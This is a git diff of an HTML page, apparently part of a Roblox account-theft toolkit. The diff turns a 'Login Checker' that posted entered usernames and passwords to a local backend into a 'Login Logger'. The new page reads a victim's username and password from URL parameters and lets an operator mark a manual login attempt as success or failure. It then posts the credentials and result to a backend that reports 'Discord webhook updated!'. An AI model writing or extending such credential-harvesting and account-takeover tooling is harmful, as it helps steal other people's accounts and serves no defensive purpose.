@@ -1,48 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Roblox Login Checker</title>
+    <meta charset="UTF-8">
+    <title>Roblox Login Logger</title>
 </head>
 <body>
-    <h1>Roblox Login Checker</h1>
+    <h2>Roblox Login Logger</h2>
 
-    <input type="text" id="username" placeholder="Username" />
-    <input type="password" id="password" placeholder="Password" />
-    <button onclick="sendLogin()">Submit Login</button>
+    <div>
+        <p><strong>User:</strong> <span id="username"></span></p>
+        <p><strong>Password:</strong> <span id="password"></span></p>
+        <p><strong>Status:</strong> <span id="status">❌ Pending Manual Login</span></p>
 
-    <p id="status"></p>
+        <button onclick="updateStatus('success')">✅ Mark as Success</button>
+        <button onclick="updateStatus('failed')">❌ Mark as Failed</button>
+    </div>
 
     <script>
-        async function sendLogin() {
-            const username = document.getElementById("username").value;
-            const password = document.getElementById("password").value;
-            const statusEl = document.getElementById("status");
+        // Example: You can replace these dynamically or get from query params
+        const username = new URLSearchParams(window.location.search).get('user') || 'DevSccz';
+        const password = new URLSearchParams(window.location.search).get('pass') || 'DevScczcookin';
 
-            if (!username || !password) {
-                statusEl.innerText = "⚠️ Please enter both username and password.";
-                return;
-            }
+        document.getElementById('username').innerText = username;
+        document.getElementById('password').innerText = password;
 
-            statusEl.innerText = "⏳ Sending login attempt...";
-
-            try {
-                const response = await fetch("http://127.0.0.1:6969/verify", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ username, password })
-                });
-
-                const data = await response.json();
-
-                if (data.status === "pending") {
-                    statusEl.innerText = "⏳ Login pending manual confirmation.";
-                } else {
-                    statusEl.innerText = "⚠️ Unexpected response from backend.";
-                }
-            } catch (err) {
-                statusEl.innerText = "❌ Failed to reach backend!";
-                console.error(err);
-            }
+        function updateStatus(result) {
+            fetch('http://127.0.0.1:6969/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password, status: result })
+            })
+            .then(() => {
+                document.getElementById('status').innerText = result === 'success' ? '✅ Success' : '❌ Failed';
+                alert('Discord webhook updated!');
+            })
+            .catch(err => alert('Failed to update backend: ' + err));
         }
     </script>
 </body>
